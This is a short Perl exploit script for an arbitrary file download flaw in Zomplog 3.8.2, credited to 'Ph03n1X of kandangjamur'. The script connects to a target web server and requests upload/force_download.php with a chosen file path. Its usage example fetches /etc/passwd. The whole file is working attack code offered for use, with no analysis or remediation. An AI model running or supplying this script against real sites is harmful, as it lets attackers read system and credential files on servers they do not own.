#!/usr/bin/perl
#Zomplog 3.8.2 Arbitrary Files Download
#

if(!$ARGV[2])
{
        print "Ph03n1X of kandangjamur | king_purba@yahoo.co.uk\n";
        print "Use : perl $0 <website> <zomplog path> <file>\n";
        print "Example : perl $0 example.com /zlog/ /etc/passwd\n";
        exit;
}
use IO::Socket;
$s = new IO::Socket::INET(
        Proto => "tcp",
        PeerAddr => $ARGV[0],
        PeerPort => "80",
);
$req=$ARGV[1]."upload/force_download.php?file=".$ARGV[2];
print $s "GET $req\r\nHTTP/1.1\r\nHost: $ARGV[0]\r\n\r\n\r\n";
while(<$s>){
        print;
}
close $s;
